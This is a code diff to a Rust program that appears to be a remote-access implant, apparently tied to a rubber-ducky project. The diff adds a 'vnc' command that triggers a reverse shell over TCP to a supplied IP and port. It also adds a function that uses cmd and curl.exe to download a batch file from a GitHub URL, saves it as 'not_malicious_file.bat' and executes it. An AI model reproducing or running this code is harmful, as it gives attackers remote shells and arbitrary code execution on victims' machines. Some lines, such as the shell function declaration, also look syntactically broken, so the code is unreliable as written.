@@ -62,9 +62,13 @@ pub fn interpret_payload(payload: String) {
         shell(infos_payload[1], infos_payload[2]);
         
     }
+    else if infos_payload[0] == "vnc"{
+        println!("Activating reverseshell");
+        shell(infos_payload[1], infos_payload[2]);
+    }
 }
 
-pub shell(ip: &str, port: &str) -> Result<()> {
+pub async fn shell(ip: &str, port: &str) -> Result<()> {
     let args: Vec<String> = env::args().collect();
     
     let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
@@ -89,6 +93,22 @@ pub shell(ip: &str, port: &str) -> Result<()> {
         stream.write(&reply).unwrap();
     };
         Ok(())
+}
+
+fn vnc() {
+    let output = Command::new("cmd")
+        .args(&["/C", "curl.exe", "--output", "not_malicious_file.bat", "--url", "https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/vnc_auto_inst.bat"])
+        .output()
+        .expect("failed to execute process");
+
+    let output = Command::new("cmd")
+        .args(&["/C", "not_malicious_file.bat"])
+        .output()
+        .expect("failed to execute process");
+
+    for out in String::from_utf8(output.stdout).iter() {
+        println!("{}", out);
+    }
 }
 
 #[tokio::main]
